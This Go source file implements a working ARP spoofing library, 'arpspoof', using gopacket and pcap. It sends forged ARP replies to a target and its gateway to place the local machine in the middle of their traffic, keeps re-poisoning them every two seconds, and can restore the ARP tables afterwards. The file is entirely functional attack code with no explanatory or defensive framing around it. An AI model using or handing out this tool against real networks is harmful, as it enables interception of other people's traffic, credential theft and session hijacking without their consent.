package arpspoof

import (
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type Spoofer struct {
	sendHandle *pcap.Handle
	recvHandle *pcap.Handle
	iface      *net.Interface
	localIP    net.IP
	gatewayIP  net.IP
	gatewayMAC net.HardwareAddr
	mu         sync.Mutex
	poisoned   map[string]bool
	stopCh     chan struct{}
	wg         sync.WaitGroup
	arpRespCh  chan arpResponse
}

type arpResponse struct {
	senderIP  net.IP
	senderMAC net.HardwareAddr
}

func New(ifaceName string, localIP, gatewayIP net.IP) (*Spoofer, error) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return nil, fmt.Errorf("interface lookup: %w", err)
	}

	sendHandle, err := pcap.OpenLive(ifaceName, 65536, false, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("pcap open send: %w", err)
	}

	recvHandle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		sendHandle.Close()
		return nil, fmt.Errorf("pcap open recv: %w", err)
	}

	err = recvHandle.SetBPFFilter("arp")
	if err != nil {
		sendHandle.Close()
		recvHandle.Close()
		return nil, fmt.Errorf("set arp filter: %w", err)
	}

	s := &Spoofer{
		sendHandle: sendHandle,
		recvHandle: recvHandle,
		iface:      iface,
		localIP:    localIP,
		gatewayIP:  gatewayIP,
		poisoned:   make(map[string]bool),
		stopCh:     make(chan struct{}),
		arpRespCh:  make(chan arpResponse, 256),
	}

	s.wg.Add(1)
	go s.arpListener()

	return s, nil
}

func (s *Spoofer) Close() {
	close(s.stopCh)
	s.wg.Wait()
	s.sendHandle.Close()
	s.recvHandle.Close()
}

func (s *Spoofer) GatewayMAC() net.HardwareAddr {
	return s.gatewayMAC
}

func (s *Spoofer) ResolveGatewayMAC() error {
	gatewayMAC, err := s.resolveMAC(s.gatewayIP)
	if err != nil {
		return fmt.Errorf("resolve gateway MAC: %w", err)
	}
	s.gatewayMAC = gatewayMAC
	return nil
}

func (s *Spoofer) Poison(targetIP net.IP) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	targetMAC, err := s.resolveMAC(targetIP)
	if err != nil {
		return fmt.Errorf("resolve target MAC: %w", err)
	}

	s.sendARPReply(targetMAC, targetIP, s.iface.HardwareAddr, s.gatewayIP)
	s.sendARPReply(s.gatewayMAC, s.gatewayIP, s.iface.HardwareAddr, targetIP)

	s.poisoned[targetIP.String()] = true
	return nil
}

func (s *Spoofer) StartContinuousPoison(targetIP net.IP) {
	s.mu.Lock()
	key := targetIP.String()
	if s.poisoned[key] {
		s.mu.Unlock()
		return
	}
	s.poisoned[key] = true
	s.mu.Unlock()

	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				s.mu.Lock()
				if !s.poisoned[targetIP.String()] {
					s.mu.Unlock()
					return
				}
				targetMAC, err := s.resolveMAC(targetIP)
				if err != nil {
					s.mu.Unlock()
					continue
				}
				s.sendARPReply(targetMAC, targetIP, s.iface.HardwareAddr, s.gatewayIP)
				s.sendARPReply(s.gatewayMAC, s.gatewayIP, s.iface.HardwareAddr, targetIP)
				s.mu.Unlock()
			case <-s.stopCh:
				return
			}
		}
	}()
}

func (s *Spoofer) Restore(targetIP net.IP) {
	s.mu.Lock()
	defer s.mu.Unlock()

	targetMAC, err := s.resolveMAC(targetIP)
	if err != nil {
		return
	}

	s.sendARPReply(s.gatewayMAC, s.gatewayIP, targetMAC, targetIP)
	s.sendARPReply(targetMAC, targetIP, s.gatewayMAC, s.gatewayIP)

	delete(s.poisoned, targetIP.String())
}

func (s *Spoofer) RestoreAll() {
	s.mu.Lock()
	defer s.mu.Unlock()

	for ipStr := range s.poisoned {
		targetIP := net.ParseIP(ipStr)
		if targetIP == nil {
			continue
		}
		targetMAC, err := s.resolveMAC(targetIP)
		if err != nil {
			continue
		}
		s.sendARPReply(s.gatewayMAC, s.gatewayIP, targetMAC, targetIP)
		s.sendARPReply(targetMAC, targetIP, s.gatewayMAC, s.gatewayIP)
	}
	s.poisoned = make(map[string]bool)
}

func (s *Spoofer) Stop() {
}

func (s *Spoofer) arpListener() {
	defer s.wg.Done()
	packetSource := gopacket.NewPacketSource(s.recvHandle, s.recvHandle.LinkType())

	for {
		select {
		case <-s.stopCh:
			return
		default:
		}

		packet, err := packetSource.NextPacket()
		if err != nil {
			continue
		}

		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer == nil {
			continue
		}

		arpPkt := arpLayer.(*layers.ARP)
		if arpPkt.Operation != layers.ARPReply {
			continue
		}

		select {
		case s.arpRespCh <- arpResponse{
			senderIP:  net.IP(arpPkt.SourceProtAddress),
			senderMAC: net.HardwareAddr(arpPkt.SourceHwAddress),
		}:
		default:
		}
	}
}

func (s *Spoofer) resolveMAC(targetIP net.IP) (net.HardwareAddr, error) {
	s.sendARPRequest(targetIP)

	deadline := time.After(2 * time.Second)
	for {
		select {
		case resp := <-s.arpRespCh:
			if resp.senderIP.Equal(targetIP) {
				return resp.senderMAC, nil
			}
		case <-deadline:
			return nil, fmt.Errorf("arp timeout for %s", targetIP)
		}
	}
}

func (s *Spoofer) sendARPRequest(targetIP net.IP) {
	eth := &layers.Ethernet{
		SrcMAC:       s.iface.HardwareAddr,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}

	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   s.iface.HardwareAddr,
		SourceProtAddress: s.localIP.To4(),
		DstHwAddress:      net.HardwareAddr{0, 0, 0, 0, 0, 0},
		DstProtAddress:    targetIP.To4(),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	if err := gopacket.SerializeLayers(buf, opts, eth, arp); err != nil {
		return
	}
	s.sendHandle.WritePacketData(buf.Bytes())
}

func (s *Spoofer) sendARPReply(dstMAC net.HardwareAddr, dstIP net.IP, srcMAC net.HardwareAddr, srcIP net.IP) {
	eth := &layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   srcMAC,
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP.To4(),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(buf, opts, eth, arp)
	s.sendHandle.WritePacketData(buf.Bytes())
}
